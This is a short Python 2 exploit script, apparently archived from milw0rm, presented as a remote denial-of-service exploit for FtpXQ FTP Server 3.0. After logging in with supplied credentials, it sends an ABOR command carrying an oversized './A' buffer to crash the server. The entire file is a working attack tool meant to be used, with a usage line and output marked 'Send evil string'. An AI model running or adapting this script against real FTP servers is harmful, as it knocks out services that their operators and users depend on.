#!/usr/bin/python
print "############################################################"
print "##                Iranian Pentesters Home                 ##"
print "##                   Www.Pentesters.Ir                    ##"
print "##                  PLATEN -[ H.jafari ]-                 ##"
print "## FtpXQ FTP Server 3.0 Remote Denial Of Service Exploit  ##"
print "## author: PLATEN                                         ##"
print "## E-mail && blog:                                        ##"
print "## hjafari.blogspot.com                                   ##"
print "## platen.secure[at]gmail[dot]com                         ##"
print "## Greetings: Cru3l.b0y, b3hz4d, Cdef3nder                ##"
print "## and all members in Pentesters.ir                       ##"
print "############################################################"
import socket
import sys
def Usage():
    print ("Usage: ./expl.py <host> <Username> <password>\n")
buffer= "./A" * 6300
def start(hostname, username, passwd):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    print "[+] " + r
    sock.send("user %s\r\n" %username)
    r=sock.recv(1024)
    sock.send("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    print "[+] Send evil string"
	
    sock.send("ABOR %s\r\n" %buffer)
    sock.close()

if len(sys.argv) <> 4:
    Usage()
    sys.exit(1)
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    start(hostname,username,passwd)
    sys.exit(0)

# milw0rm.com [2009-09-14]